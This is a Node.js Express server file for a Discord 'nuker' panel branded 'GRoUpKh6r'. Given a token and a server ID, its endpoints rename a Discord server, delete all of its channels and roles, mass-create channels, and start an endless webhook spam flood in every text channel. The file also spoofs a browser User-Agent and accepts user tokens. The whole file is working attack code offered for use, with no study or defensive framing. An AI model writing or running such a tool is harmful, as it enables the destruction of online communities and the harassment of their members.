// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_API = 'https://discord.com/api/v10';

const getHeaders = (token) => ({
    'Authorization': token.startsWith('Bot ') || token.length > 60 ? token : `Bot ${token}`,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
});

// Server rename
app.post('/api/guild/rename', async (req, res) => {
    const { token, guildId, name } = req.body;
    try {
        await axios.patch(`${DISCORD_API}/guilds/${guildId}`, { name }, { headers: getHeaders(token) });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// Delete channels and roles
app.post('/api/guild/purge', async (req, res) => {
    const { token, guildId } = req.body;
    try {
        const headers = getHeaders(token);
        const [channelsRes, rolesRes] = await Promise.all([
            axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers }),
            axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, { headers })
        ]);

        const deletePromises = [
            ...channelsRes.data.map(c => axios.delete(`${DISCORD_API}/channels/${c.id}`, { headers }).catch(() => {})),
            ...rolesRes.data.filter(r => r.name !== '@everyone').map(r => axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${r.id}`, { headers }).catch(() => {}))
        ];

        await Promise.allSettled(deletePromises);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// Create channels without numbering suffixes
app.post('/api/guild/create-channels', async (req, res) => {
    const { token, guildId, name, count } = req.body;
    try {
        const headers = getHeaders(token);
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(
                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
                    name: name,
                    type: 0
                }, { headers }).catch(() => {})
            );
        }
        await Promise.allSettled(promises);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

// Webhook spam flood
app.post('/api/guild/webhook-spam', async (req, res) => {
    const { token, guildId, messageText } = req.body;
    try {
        const headers = getHeaders(token);
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, { headers });
        const textChannels = channelsRes.data.filter(c => c.type === 0);

        // Create webhooks in all text channels concurrently
        const webhookPromises = textChannels.map(async (channel) => {
            try {
                const whRes = await axios.post(`${DISCORD_API}/channels/${channel.id}/webhooks`, {
                    name: 'GRoUpKh6r-Spam'
                }, { headers });
                return whRes.data;
            } catch {
                return null;
            }
        });

        const webhooks = (await Promise.all(webhookPromises)).filter(Boolean);

        // Continuous high-speed spam execution
        res.json({ success: true, webhooksCreated: webhooks.length });

        // Fire asynchronous infinite spam flood
        global.spamActive = true;
        const spamLoop = async () => {
            while (global.spamActive) {
                await Promise.allSettled(webhooks.map(wh => 
                    axios.post(`https://discord.com/api/webhooks/${wh.id}/${wh.token}`, {
                        content: messageText
                    }).catch(() => {})
                ));
            }
        };
        spamLoop();

    } catch (e) {
        res.json({ success: false, error: e.response?.data || e.message });
    }
});

app.post('/api/guild/stop-spam', (req, res) => {
    global.spamActive = false;
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`[+] GRoUpKh6r panel active on port ${PORT}`);
});
